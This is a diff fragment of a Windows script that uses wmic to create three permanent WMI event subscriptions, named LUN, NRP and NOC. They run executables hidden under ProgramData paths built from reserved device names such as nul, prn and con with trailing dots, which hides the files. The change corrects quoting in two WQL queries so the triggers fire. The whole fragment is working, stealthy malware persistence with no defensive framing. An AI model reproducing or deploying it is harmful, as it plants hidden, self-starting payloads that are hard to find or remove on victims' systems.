@@ -2,11 +2,11 @@ wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="LUN", Even
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LUN", CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"LUN\"", Consumer="CommandLineEventConsumer.Name=\"LUN\""
 
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NRP", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300'"
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NRP", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="NRP", CommandLineTemplate="\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"NRP\"", Consumer="CommandLineEventConsumer.Name=\"NRP\""
 
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NOC", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 370'"
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NOC", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 370"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="NOC", CommandLineTemplate="\\.\%ProgramData%\condata..\con.exe \\.\%ProgramData%\condata..\con"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"NOC\"", Consumer="CommandLineEventConsumer.Name=\"NOC\""
 
